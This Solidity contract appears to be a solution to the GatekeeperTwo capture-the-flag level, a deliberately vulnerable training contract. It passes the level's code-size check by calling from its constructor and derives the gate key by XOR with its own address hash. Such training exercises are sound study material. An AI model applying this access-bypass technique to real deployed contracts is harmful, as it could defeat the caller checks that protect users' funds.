// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address _target) public {
        uint64 gateKey = (uint64(0) - 1) ^
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        IGatekeeperTwo gateKeeper = IGatekeeperTwo(_target);

        gateKeeper.enter(bytes8(gateKey));
    }
}
